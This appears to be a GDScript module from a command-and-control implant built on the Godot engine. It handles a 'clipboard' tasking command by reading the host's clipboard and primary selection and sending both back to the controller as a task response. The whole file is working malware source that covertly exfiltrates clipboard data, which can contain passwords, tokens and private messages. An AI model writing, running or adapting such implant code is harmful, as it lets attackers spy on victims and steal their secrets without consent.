extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_clipboard(task):

	if task.has("command") and task.get("command") == "clipboard":

		api.send_agent_response(
			api.create_task_response(
				true,
				true,
				task.get("id"),
				"Clipboard: %s\nPrimary: %s\n" % [DisplayServer.clipboard_get(), DisplayServer.clipboard_get_primary()]
			)
		)
	else:
		pass
		# TODO: error state
